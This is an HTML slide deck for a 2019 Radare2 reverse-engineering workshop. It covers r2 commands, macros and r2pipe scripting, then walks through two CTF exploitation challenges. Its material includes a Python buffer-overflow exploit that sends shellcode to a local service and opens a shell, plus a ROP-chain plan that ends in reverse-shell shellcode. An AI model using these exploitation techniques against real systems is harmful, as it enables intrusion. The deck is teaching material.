<!DOCTYPE html>
<html>
  <head>
    <title>Radare2</title>
    <meta charset="utf-8">
    <style>
        @import url(https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,500,500i,700,700i);
        @import url(https://cdn.rawgit.com/tonsky/FiraCode/1.204/distr/fira_code.css);

        body {
          font-family: 'Fira Sans','Droid Serif', 'Palatino Linotype', 'Book Antiqua', Palatino, 'Microsoft YaHei', 'Songti SC', serif;
        }

        .remark-code, .remark-inline-code {
          font-family: 'Fira Code', 'Lucida Console', Monaco, monospace;
          font-size: 80%;
        }

        .remark-slide-content {
            background-color: #FAFAFA;
            border-top: 80px solid #23373B;
            font-size: 20px;
            font-weight: 300;
            line-height: 1.5;
            padding: 1em 2em 1em 2em
          }
          .title-slide .inverse .remark-slide-content {
            background-color: #FAFAFA;
          }
          .inverse {
            background-color: #23373B;
            text-shadow: none;
          }
          .remark-slide-content > h1 {
            font-family: 'Fira Sans';
            font-weight: normal;
            font-size: 45px;
            margin-top: -95px;
            margin-left: -00px;
            color: #FAFAFA;
          }
          .remark-slide-content > inverse {
          width: 112px;
          height: 47px;
          border-bottom: 1px solid black;
          position: absolute;
          }
          /* Removes colored bar from top of the slide resulting in a clear slide */
          .clear{
            border-top: 0px solid #FAFAFA;
          }
          .remark-slide-content > h2, h3, h4 {
            padding-top: -15px;
            padding-bottom: 00px;
            color: #1A292C;
            text-shadow: none;
            font-weight: 400;
            text-align: left;
            margin-left: 00px;
            margin-bottom: -10px;
          }
          .remark-slide-content > h2, .pull-left > h2, .pull-right > h2 {
            font-size: 35px;
          }
          .remark-slide-content > h3, .remark-slide-content > h4,
          .pull-left > h3, .pull-left > h4, .pull-right > h3, .pull-right > h4 {
            font-size: 30px;
          }
          .title-slide {
            background-color: #FAFAFA;
            border-top: 80px solid #FAFAFA;
          }
          .title-slide > h1  {
            color: #1A292C;
            font-size: 40px;
            text-shadow: none;
            font-weight: 400;
            text-align: left;
            margin-left: 15px;
            padding-top: 80px;
          }
          .title-slide > h2  {
            margin-top: -25px;
            padding-bottom: -20px;
            color: #1A292C;
            text-shadow: none;
            font-weight: 300;
            font-size: 35px;
            text-align: left;
            margin-left: 15px;
          }
          .title-slide > h3  {
            color: #1A292C;
            text-shadow: none;
            font-weight: 300;
            font-size: 25px;
            text-align: left;
            margin-left: 15px;
            margin-bottom: -30px;
          }
          .remark-slide-number {
            font-size: 13pt;
            font-family: 'Fira Sans';
            color: #272822;
            opacity: 1;
          }
          .inverse .remark-slide-number {
            font-size: 13pt;
            font-family: 'Fira Sans';
            color: #FAFAFA;
            opacity: 1;
          }
          /* turns off slide numbers for title page: https://github.com/gnab/remark/issues/298 */
          .title-slide .remark-slide-number {
            display: none;
          }
          .remark-inline-code {
            /* background: #F5F5F5; /* lighter */
            background: #e7e8e2; /* darker */
            border-radius: 3px;
            padding: 4px;
          }
          .code10 .remark-code {
            font-size: 10%;
          }
          .code20 .remark-code {
            font-size: 20%;
          }
          .code30 .remark-code {
            font-size: 30%;
          }
          .code40 .remark-code {
            font-size: 40%;
          }
          .code50 .remark-code {
            font-size: 50%;
          }
          .code60 .remark-code {
            font-size: 60%;
          }
          .code70 .remark-code {
            font-size: 70%;
          }
          .code80 .remark-code {
            font-size: 80%;
          }
          .code90 .remark-code {
            font-size: 90%;
          }
          .code100 .remark-code {
            font-size: 100%;
          }
          .font10 {
            font-size: 10%;
          }
          .font20 {
            font-size: 20%;
          }
          .font30 {
            font-size: 30%;
          }
          .font40 {
            font-size: 40%;
          }
          .font50 {
            font-size: 50%;
          }
          .font60 {
            font-size: 60%;
          }
          .font70 {
            font-size: 70%;
          }
          .font80 {
            font-size: 80%;
          }
          .font90 {
            font-size: 90%;
          }
          .font100 {
            font-size: 100%;
          }
          .font110 {
            font-size: 110%;
          }
          .font120 {
            font-size: 120%;
          }
          .font130 {
            font-size: 130%;
          }
          .font140 {
            font-size: 140%;
          }
          .font150 {
            font-size: 150%;
          }
          .font160 {
            font-size: 160%;
          }
          .font170 {
            font-size: 170%;
          }
          .font180 {
            font-size: 180%;
          }
          .font190 {
            font-size: 190%;
          }
          .font200 {
            font-size: 200%;
          }
    </style>
  </head>
  <body>
    <textarea id="source">
---
class: middle, center

# Workshop Radare2

<img src="./r2.png"  height="100" style="margin:auto;">

## Grehack 2019

---
class: left, top

# Radare2 workshop!

- No money to buy IDA?<br>
- No java to run Ghidra?<br>
- No time to write Binary Ninja plugins to make it useful?<br>
- Failed to get a seat at the [miasm](https://grehack.fr/2019/workshops#miasm) workshop?<br>

Welcome to radare2!

---

# Agenda

1. What is this radare2 thing?
1. How do I radare2?
2. How do I impress my CTF pals with it?
3. How can I get r2 swag?
4. How do I automate things in radare2?

---

# Who are we?

### Julien (jvoisin) Voisin
- dustri.org

### Simon (smagnin) Magnin
- smagnin.org


---

# What is this radare2 thing?

### It's like vim in Dwarf Fortress, right?

---

# What is radare2?

- Reverse engineering *framework*
- Open-sauce
- Extensible
- Command-line

---

# Install radare2 ?

- `git clone https://github.com/radare/radare2`
- `cd radare2`
- `git checkout last-version`
- `./sys/install.sh`

---

# How do I radare2?

### What do you mean "command line"?!

---

# Commands

- Every character has a purpose/meaning
	- `p` → `p`rint
	- `d` → `d`isassemble
- Combine them to form commands
	- `pd` → `print` + `disassemble`
- Everything is documented with `?`
	- `pd?`
	- recursive help via `?*`


---

# Commands (ex.)

- How do you print a hexdump?
- How do you analyze and opcode?
- XXX

---

# Do you want to automate ?

- internal ways of sequencing commands
- `r2pipe` (IPC)

---

# Internal basics

- `pd 1; ao 1`
- `ao | grep name`
- `ao > test.txt`
- `ao >> test.txt`

---

# Internal loops

- classic loop : `@@=$$ $$+2`
- foreach : `@@i`
- loop over a flag: `afi @@ fcn.* ~name`
- and many others... `@@?` ;)

---

# Define Macros

- define it : `(foobar, pd1, ao)`
- use it : `.(foobar)`
- don't remember your macro ? `(*`
- remove it : `(-foobar)`

---

# Macros with arguments

- `(foobar arg1, pd $0)`

---

# You don't like r2 cli ?

- `r2pipe` works with your favourite language
- NodeJS, Python, Java, Ruby, ...

---

# Install r2pipe

- `npm install r2pipe`
- `pip install r2pipe`

---

# r2pipe use

```python
import r2pipe

r2 = r2pipe.open('./sushi-a6cb...98c8')
r2.cmd('aa')
print(r2.cmd('pdf'))
r2.cmd('s main')
print(r2.cmd('pdf'))
```

---


# How do I impress my CTF 🏴 pals with it?

### Excellent, we can attack in any direction!

---

# Pop Quizz

♪ Put your hands in the air if you know about ♫

- Exploitation
- Buffer overflows
- ROP chains
- Mitigations
- CTF


---

# Sushi — BSides Vancouver CTF 2015

![logo bsides vc](./bsides-vancouver.png)

- Cool CTF, organised by nice people
- Super-easy challenge

---

# Recon and mitigations

```nasm
$ r2 ./sushi-a6cbcb6...98cb4f98c8
[0x004004a0]> i~canary
[0x004004a0]> i~format
[0x004004a0]> i~nx
[0x004004a0]> i~pic
[0x004004a0]> i~relro
```

---

# How to run the binary?

Use rarun:

```
$ rarun2 program=./sushi-a6cbc...4f98c8 listen=4444
$ rarun2 -h
```

---

# Reversing (ex.)

```nasm
[0x004004a0]> aa
[0x004004a0]> pdf
[0x004004a0]> s main
[0x004004a0]> pdf
```

What is the main function doing?

---

# Reversing (ex.)

```nasm
[0x004004a0]> aa
[0x004004a0]> pdf
[0x004004a0]> s main
[0x004004a0]> pdf
```

What is the main function doing?

```c
int main(int argc, char** argv) {
  char local_40[0x40];
  printf(“Deposit money for sushi here:     %p\n”, local_40);
  fflush(stdout);
  gets(local_40):
  printf(“Sorry, $0.%d is not enough.\n”, local_40);
  fflush(stdout);
  return 0
}

```

---

# Getting RIP control (ex.)

```nasm
$ ragg2 -P 128 -r
$ r2 -d ./sushi-a6cbc...8cb4f98c8
[0x7fd1f7ebc090]> dc
[0x004005f2]> dr=
[0x004005f2]> pd 1 @ rip
[0x004005f2]> pxW 4 @ rsp
[0x004005f2]> wopO `pxW 4 @ rsp~[1]`
```
---

# Getting RIP control (ex.)

```nasm
$ ragg2 -P 128 -r
$ r2 -d ./sushi-a6cbc...8cb4f98c8
[0x7fd1f7ebc090]> dc
[0x004005f2]> dr=
[0x004005f2]> pd 1 @ rip
[0x004005f2]> pxW 4 @ rsp
[0x004005f2]> wopO `pxW 4 @ rsp~[1]`
```

72 chars until RIP control

---

# Writing an exploit (ex.)

Our payload will look like this:

```python
shellcode | ‘A’* (72 - len(shellcode)) | buffer_addr
```
```python
$ ragg2 -z -i exec
```

Can you build a working exploit?

---

# Exploit

```python
import socket, struct, re

def rop(*args):  # 'Q' and not 'I' for x64
    return struct.pack('Q'*len(args), *args)

shellcode = "\x31...\x05"
s = socket.create_connection(('127.0.0.1', 4444))
buffer_addr = re.search('^Deposit money for sushi   here: (.+)$',
    s.recv(1024)).group(1)
buffer_addr = int(buffer_addr, 16)

s.send(shellcode + 'A'*(72 - len(shellcode)) +
    rop(buffer_addr) + '\n')
s.recv(1024)

while(True):
    s.send(raw_input('$ ') + '\n')
    print(s.recv(1024))
```

---

# CSAW Quals 2013 - Diary (Exploitation 300)


- CSAW quals 2013
- easy CTF challenge

---

# Mitigations (ex.)

- PIE?
- RELRO?
- NX?
- Canary?
- ASLR!

---

# What is the binary doing? (ex.)

- Hint1: some networking stuff
- Hint2: on what port does it listen?

---

# Find the username/password (ex.)

---

# Find the username/password (ex.)

- `csaw2013`
- `S1mplePWD`

---

# What is the binary doing? (ex.)

---

# What is the binary doing?

```C
void __cdecl read_data(int fd, int size) {
 if ( size + 1 <= 0x400 ) {
  char buf[0x41C];
  int nbread = recv(fd, &buf, size, 0);
  else {
   nbread = nbread > 0x400? 1024; nbread;
   if (!check_nonnull(&buf, nbread)) {
    fprintf(stderr, "%s\n", "This entry had Non-ASCII characters.. not writing entry..");
   } else {
    char s[0x80] = {0};
    snprintf(&s, 0x7Fu, "diary%llu.txt", global_cpt);
    FILE* stream = fopen(&s, "w");
    if ( stream ) {
     if ( nbread == fwrite(&buf, 1u, nbread, stream))
      fflush(stream)
     fclose_and_remove(stream, &s);
    }
   }
  }
 }
}
````

---

# What is the binary doing?

1. Asking for a `size` in `fcn.08048e52`
1. Checks that `size+1` isn't superior to `0x400` in `fcn.08048efe`
1. Read `size` chars
1. Write the chars to a file
1. Delete the file

---

# Find the vulnerability (ex.)

- Hint1: What could the vulnerability type be?
- Hint2: `atoi`


---

# Find the vulnerability (ex.)

- `size` is passed to `atoi`, returning an `int`
- `if size + 1 > 0x400` → integer overflow!
- resulting in a linear stack-based buffer-overflow

---

# Getting eip control (ex.)

```nasm
$ ragg2 -P 128 -r
$ r2 -d ./fil_chal
[0x7fd1f7ebc090]> dc
[0x004005f2]> dr=
[0x004005f2]> pd 1 @ rip
[0x004005f2]> pxW 4 @ rsp
[0x004005f2]> woO `pxW 4 @ rsp~[1]`
```

1056 bytes before overwriting EIP

---

# Get RIP control (ex.)

---

# Designing our ROP chain

1. Leak libc address of read(1) and return to the vulnerable
function
2. Compute the offset of system(2)
3. Read our command, and write it somewhere
4. Call system(3) on it
5. Send our command

But…

---

# Plot twist

1. Stack is executable
2. No jmp esp gadget
3. Write jmp esp in the .data segment
4. Return to it
5. Send our reverse-shell shellcode

---

# Find a writteable place (ex.)

- iS~w

---

# Exploit

```
read
pop;pop;pop;ret
4 (socket fd)
writeable addr
2 (size of jmp esp gadget)
writeable addr
```


---

# How can I get r2 swag?

### How much did you say for the radare2 plumbus?

---

#

---
# Documentations and friendly neighbours


- The [r2book](https://radare.gitbooks.io/radare2book/content)
- [IRC](irc://irc.freenode.net/radare)/[Telegram](https://telegram.me/joinchat/ACR-FkEK2owJSzMUYjt_NQ)/…
- The [r2con]( https://www.radare.org/con/ )

---

# Cheers

 - Xarkes for inviting us!

---
background-position: center;
background-size: contain;
background-image: url(clippy.png)

   </textarea>
    <script src="./remark-latest.min.js"></script>
    <script>
      var slideshow = remark.create({highlightLines: true});
    </script>
  </body>
</html>
